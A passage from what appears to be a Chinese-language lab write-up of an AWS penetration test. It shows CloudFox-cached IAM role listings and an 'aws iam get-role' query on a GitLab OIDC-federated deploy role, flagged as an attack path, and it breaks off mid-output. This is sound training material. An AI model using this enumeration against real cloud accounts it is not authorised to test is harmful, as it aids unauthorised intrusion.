class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AROAYLH5JA4JKC3T6CCB4&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AWSServiceRoleForAccessAnalyzer&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;AssumeRolePolicyDocument&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%7B%22Version%22%3A%222012-10-17%22%2C%22Statement%22%3A%5B%7B%22Effect%22%3A%22Allow%22%2C%22Principal%22%3A%7B%22Service%22%3A%22access-analyzer.amazonaws.com%22%7D%2C%22Action%22%3A%22sts%3AAssumeRole%22%7D%5D%7D&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Description&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;MaxSessionDuration&quot;</span><span class="punctuation">:</span> <span class="number">3600</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;PermissionsBoundary&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleLastUsed&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Tags&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::573909305106:role/aws-service-role/ops.apigateway.amazonaws.com/AWSServiceRoleForAPIGateway&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;CreateDate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-08-11T14:51:28Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/aws-service-role/ops.apigateway.amazonaws.com/&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AROAYLH5JA4JLLW22QCUP&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AWSServiceRoleForAPIGateway&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;AssumeRolePolicyDocument&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%7B%22Version%22%3A%222012-10-17%22%2C%22Statement%22%3A%5B%7B%22Effect%22%3A%22Allow%22%2C%22Principal%22%3A%7B%22Service%22%3A%22ops.apigateway.amazonaws.com%22%7D%2C%22Action%22%3A%22sts%3AAssumeRole%22%7D%5D%7D&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;The Service Linked Role is used by Amazon API Gateway.&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;MaxSessionDuration&quot;</span><span class="punctuation">:</span> <span class="number">3600</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;PermissionsBoundary&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleLastUsed&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Tags&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::573909305106:role/aws-service-role/cost-optimization-hub.bcm.amazonaws.com/AWSServiceRoleForCostOptimizationHub&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;CreateDate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2024-03-20T04:56:14Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/aws-service-role/cost-optimization-hub.bcm.amazonaws.com/&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AROAYLH5JA4JNQXWH533U&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AWSServiceRoleForCostOptimizationHub&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;AssumeRolePolicyDocument&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%7B%22Version%22%3A%222012-10-17%22%2C%22Statement%22%3A%5B%7B%22Effect%22%3A%22Allow%22%2C%22Principal%22%3A%7B%22Service%22%3A%22cost-optimization-hub.bcm.amazonaws.com%22%7D%2C%22Action%22%3A%22sts%3AAssumeRole%22%7D%5D%7D&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Description&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;MaxSessionDuration&quot;</span><span class="punctuation">:</span> <span class="number">3600</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;PermissionsBoundary&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleLastUsed&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Tags&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::573909305106:role/aws-service-role/organizations.amazonaws.com/AWSServiceRoleForOrganizations&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;CreateDate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2023-06-08T08:09:22Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/aws-service-role/organizations.amazonaws.com/&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AROAYLH5JA4JHLJABCMDM&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AWSServiceRoleForOrganizations&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;AssumeRolePolicyDocument&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%7B%22Version%22%3A%222012-10-17%22%2C%22Statement%22%3A%5B%7B%22Effect%22%3A%22Allow%22%2C%22Principal%22%3A%7B%22Service%22%3A%22organizations.amazonaws.com%22%7D%2C%22Action%22%3A%22sts%3AAssumeRole%22%7D%5D%7D&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Service-linked role used by AWS Organizations to enable integration of other AWS services with Organizations.&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;MaxSessionDuration&quot;</span><span class="punctuation">:</span> <span class="number">3600</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;PermissionsBoundary&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleLastUsed&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Tags&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::573909305106:role/aws-service-role/servicequotas.amazonaws.com/AWSServiceRoleForServiceQuotas&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;CreateDate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2023-06-08T08:19:24Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/aws-service-role/servicequotas.amazonaws.com/&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AROAYLH5JA4JMCY4HW6L5&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AWSServiceRoleForServiceQuotas&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;AssumeRolePolicyDocument&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%7B%22Version%22%3A%222012-10-17%22%2C%22Statement%22%3A%5B%7B%22Effect%22%3A%22Allow%22%2C%22Principal%22%3A%7B%22Service%22%3A%22servicequotas.amazonaws.com%22%7D%2C%22Action%22%3A%22sts%3AAssumeRole%22%7D%5D%7D&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;A service-linked role is required for Service Quotas to access your service limits.&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;MaxSessionDuration&quot;</span><span class="punctuation">:</span> <span class="number">3600</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;PermissionsBoundary&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleLastUsed&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Tags&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::573909305106:role/aws-service-role/sso.amazonaws.com/AWSServiceRoleForSSO&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;CreateDate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2023-06-08T08:09:37Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/aws-service-role/sso.amazonaws.com/&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AROAYLH5JA4JM6Q5JNBQI&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AWSServiceRoleForSSO&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;AssumeRolePolicyDocument&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%7B%22Version%22%3A%222012-10-17%22%2C%22Statement%22%3A%5B%7B%22Effect%22%3A%22Allow%22%2C%22Principal%22%3A%7B%22Service%22%3A%22sso.amazonaws.com%22%7D%2C%22Action%22%3A%22sts%3AAssumeRole%22%7D%5D%7D&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Service-linked role used by AWS SSO to manage AWS resources, including IAM roles, policies and SAML IdP on your behalf.&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;MaxSessionDuration&quot;</span><span class="punctuation">:</span> <span class="number">3600</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;PermissionsBoundary&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleLastUsed&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Tags&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::573909305106:role/aws-service-role/support.amazonaws.com/AWSServiceRoleForSupport&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;CreateDate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2023-06-08T08:09:21Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/aws-service-role/support.amazonaws.com/&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AROAYLH5JA4JIRM64BLIF&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AWSServiceRoleForSupport&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;AssumeRolePolicyDocument&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%7B%22Version%22%3A%222012-10-17%22%2C%22Statement%22%3A%5B%7B%22Effect%22%3A%22Allow%22%2C%22Principal%22%3A%7B%22Service%22%3A%22support.amazonaws.com%22%7D%2C%22Action%22%3A%22sts%3AAssumeRole%22%7D%5D%7D&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Enables resource access for AWS to provide billing, administrative and support services&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;MaxSessionDuration&quot;</span><span class="punctuation">:</span> <span class="number">3600</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;PermissionsBoundary&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleLastUsed&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Tags&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::573909305106:role/aws-service-role/trustedadvisor.amazonaws.com/AWSServiceRoleForTrustedAdvisor&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;CreateDate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2023-06-08T08:09:21Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/aws-service-role/trustedadvisor.amazonaws.com/&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AROAYLH5JA4JLX6QJ2OBY&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AWSServiceRoleForTrustedAdvisor&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;AssumeRolePolicyDocument&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%7B%22Version%22%3A%222012-10-17%22%2C%22Statement%22%3A%5B%7B%22Effect%22%3A%22Allow%22%2C%22Principal%22%3A%7B%22Service%22%3A%22trustedadvisor.amazonaws.com%22%7D%2C%22Action%22%3A%22sts%3AAssumeRole%22%7D%5D%7D&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Access for the AWS Trusted Advisor Service to help reduce cost, increase performance, and improve security of your AWS environment.&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;MaxSessionDuration&quot;</span><span class="punctuation">:</span> <span class="number">3600</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;PermissionsBoundary&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleLastUsed&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Tags&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::573909305106:role/engineering&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;CreateDate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-09-22T09:02:01Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AROAYLH5JA4JHE7D3U2FW&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;engineering&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;AssumeRolePolicyDocument&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%7B%22Version%22%3A%222012-10-17%22%2C%22Statement%22%3A%5B%7B%22Sid%22%3A%22AllowEngineersToAssumeRole%22%2C%22Effect%22%3A%22Allow%22%2C%22Principal%22%3A%7B%22AWS%22%3A%5B%22arn%3Aaws%3Aiam%3A%3A573909305106%3Auser%2Flouise%22%2C%22arn%3Aaws%3Aiam%3A%3A573909305106%3Auser%2Fbob%22%5D%7D%2C%22Action%22%3A%22sts%3AAssumeRole%22%7D%5D%7D&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Description&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;MaxSessionDuration&quot;</span><span class="punctuation">:</span> <span class="number">3600</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;PermissionsBoundary&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleLastUsed&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Tags&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::573909305106:role/gitlab_terraform_deploy&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;CreateDate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-09-22T09:01:45Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AROAYLH5JA4JBH2BE6EHN&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gitlab_terraform_deploy&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;AssumeRolePolicyDocument&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%7B%22Version%22%3A%222012-10-17%22%2C%22Statement%22%3A%5B%7B%22Sid%22%3A%22AllowGitLabFromHugeLogistics%22%2C%22Effect%22%3A%22Allow%22%2C%22Principal%22%3A%7B%22Federated%22%3A%22arn%3Aaws%3Aiam%3A%3A573909305106%3Aoidc-provider%2Fgitlab.com%22%7D%2C%22Action%22%3A%22sts%3AAssumeRoleWithWebIdentity%22%2C%22Condition%22%3A%7B%22StringEquals%22%3A%7B%22gitlab.com%3Aaud%22%3A%22https%3A%2F%2Fgitlab.com%22%7D%2C%22StringLike%22%3A%7B%22gitlab.com%3Asub%22%3A%22project_path%3Ahuge-logistics%2F%2A%22%7D%7D%7D%5D%7D&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Description&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;MaxSessionDuration&quot;</span><span class="punctuation">:</span> <span class="number">3600</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;PermissionsBoundary&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleLastUsed&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Tags&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::573909305106:role/OrganizationAccountAccessRole&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;CreateDate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2023-06-08T08:09:21Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AROAYLH5JA4JJSOWUXT4K&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;OrganizationAccountAccessRole&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;AssumeRolePolicyDocument&quot;</span><span class="punctuation">:</span> <span class="string">&quot;%7B%22Version%22%3A%222012-10-17%22%2C%22Statement%22%3A%5B%7B%22Effect%22%3A%22Allow%22%2C%22Principal%22%3A%7B%22AWS%22%3A%22arn%3Aaws%3Aiam%3A%3A036528129738%3Aroot%22%7D%2C%22Action%22%3A%22sts%3AAssumeRole%22%7D%5D%7D&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Description&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;MaxSessionDuration&quot;</span><span class="punctuation">:</span> <span class="number">3600</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;PermissionsBoundary&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;RoleLastUsed&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Tags&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Exp&quot;</span><span class="punctuation">:</span> <span class="number">1758546400320609754</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="发现攻击路径：GitLab-OIDC-信任角色"><a href="#发现攻击路径：GitLab-OIDC-信任角色" class="headerlink" title="发现攻击路径：GitLab OIDC 信任角色"></a>发现攻击路径：GitLab OIDC 信任角色</h3><p>可以使用 <code>aws iam get-role --role-name gitlab_terraform_deploy</code> 命令获取到该 IAM 角色的详细信息，包括角色 ARN、创建时间、权限策略、信任关系等。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">yliken@LAPTOP<span class="number">-40</span>PQI58C<span class="punctuation">:</span>~/.cloudfox/cached-data/aws/<span class="number">573909305106</span>$ aws iam get-role --role-name gitlab_terraform_deploy</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Role&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;RoleName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gitlab_terraform_deploy&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;RoleId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AROAYLH5JA4JBH2BE6EHN&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Arn&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::573909305106:role/gitlab_terraform_deploy&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;CreateDate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-09-22T09:01:45+00:00&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;AssumeRolePolicyDocument&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;Sid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AllowGitLabFromHugeLogistics&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;Federated&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:iam::573909305106:oidc-provider/gitlab.com&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sts:AssumeRoleWithWebIdentity&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;Condition&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;StringEquals&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;gitlab.com:aud&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://gitlab.com&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;StringLike&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;gitlab.com:sub&quot;</span><span class="punctuation">:</span> <span 